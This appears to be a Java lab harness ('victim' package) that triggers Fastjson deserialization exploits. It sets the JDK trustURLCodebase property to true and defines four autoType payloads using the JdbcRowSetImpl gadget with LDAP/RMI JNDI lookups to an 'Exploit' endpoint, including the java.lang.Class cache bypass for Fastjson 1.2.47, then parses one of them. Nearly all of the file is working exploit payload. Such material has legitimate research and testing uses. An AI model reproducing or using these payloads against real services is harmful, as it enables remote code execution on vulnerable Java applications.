package cn.eovie.victim;

import com.alibaba.fastjson.JSONObject;

/**
 * Created by earayu on 2017/12/7.
 */
public class SomeFastjsonApp {

    public static void main(String[] argv){
        testJdbcRowSetImpl();
    }

    public static void testJdbcRowSetImpl(){
        //JDK 8u121以后版本需要设置改系统变量
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        //LADP 方式
        String payload1 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\"," + " \"autoCommit\":true}";
        //RMI 方式
        String payload2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\"," +
                " \"autoCommit\":true}";

        // 2019-08-01 针对1.2.47的攻击
        String payload3 =
                "{\n" +
                        "    \"a\":{\n" +
                        "        \"@type\":\"java.lang.Class\",\n" +
                        "        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +
                        "    },\n" +
                        "    \"b\":{\n" +
                        "        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
                        "        \"dataSourceName\":\"ldap://localhost:1389/Exploit\",\n" +
                        "        \"autoCommit\":true\n" +
                        "    }\n" +
                        "}";

        String payload4 =
                "{\n" +
                        "    \"a\":{\n" +
                        "        \"@type\":\"java.lang.Class\",\n" +
                        "        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +
                        "    },\n" +
                        "    \"b\":{\n" +
                        "        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
                        "        \"dataSourceName\":\"rmi://localhost:1099/Exploit\",\n" +
                        "        \"autoCommit\":true\n" +
                        "    }\n" +
                        "}";
        JSONObject.parseObject(payload4);
    }

}
